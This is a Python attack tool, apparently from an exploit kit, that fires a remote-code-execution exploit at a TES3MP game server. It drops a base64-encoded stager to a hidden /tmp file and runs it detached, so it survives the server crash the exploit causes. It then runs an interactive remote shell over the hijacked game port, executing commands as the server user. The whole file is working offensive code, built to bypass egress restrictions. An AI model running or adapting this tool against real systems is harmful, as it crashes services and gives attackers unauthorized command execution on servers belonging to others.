#!/usr/bin/env python3
# Interactive shell over the reused game socket, for a target whose egress is sealed to all but the inbound
# game flow. Fires tes3mp-rce with a payload that drops tools/stager.py detached; the stager survives the
# server crash and owns :25565; this client then talks to it over that port. See tools/stager.py.
#
#   ./tools/rce-shell.py -P '<server password>' <host>
#   ./tools/rce-shell.py --no-fire <host>          # attach to a stager already running
import socket, sys, subprocess, base64, time, os, argparse
HERE = os.path.dirname(os.path.abspath(__file__))
M = b'RCESH:'

def recv_until_end(s):
    out = []
    while True:
        try:
            d, _ = s.recvfrom(65535)
        except socket.timeout:
            return None
        if not d.startswith(M):
            continue
        p = d[len(M):]
        if p == b'\x00END':
            return b''.join(out)
        out.append(p)

def main():
    ap = argparse.ArgumentParser(description="interactive shell over the reused TES3MP game socket")
    ap.add_argument('host')
    ap.add_argument('--port', type=int, default=25565)
    ap.add_argument('-P', '--server-password', dest='pw', default='')
    ap.add_argument('--exploit', default=os.path.join(HERE, '..', 'tes3mp-rce'))
    ap.add_argument('--no-fire', action='store_true', help="don't fire the exploit; attach to a running stager")
    ap.add_argument('--wait', type=float, default=8.0, help="seconds to wait for the crash + stager takeover")
    a = ap.parse_args()

    if not a.no_fire:
        stager = open(os.path.join(HERE, 'stager.py'), 'rb').read()
        b64 = base64.b64encode(stager).decode()
        payload = "echo %s|base64 -d>/tmp/.r;setsid python3 /tmp/.r </dev/null >/dev/null 2>&1 &" % b64
        cmd = [a.exploit]
        if a.pw:
            cmd += ['-P', a.pw]
        cmd += ['-c', payload, a.host, str(a.port)]
        print('[*] firing exploit to drop the stager (this crashes the game server; the stager survives)...')
        subprocess.run(cmd)
        print('[*] waiting %gs for the server to crash and the stager to take :%d...' % (a.wait, a.port))
        time.sleep(a.wait)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(15)
    s.sendto(M + b'id', (a.host, a.port))
    who = recv_until_end(s)
    if who is None:
        print("[!] no reply from the stager. Either it didn't start, or the target can't reply on this flow.")
        sys.exit(1)
    print('[+] shell is live as:', who.decode('utf-8', 'replace').strip())
    print('[*] commands run as the server user on the target. ctrl-D to exit.\n')
    while True:
        try:
            c = input('prod$ ')
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not c.strip():
            continue
        s.sendto(M + c.encode(), (a.host, a.port))
        out = recv_until_end(s)
        if out is None:
            print('[timeout]'); continue
        sys.stdout.write(out.decode('utf-8', 'replace'))
        sys.stdout.flush()

if __name__ == '__main__':
    main()
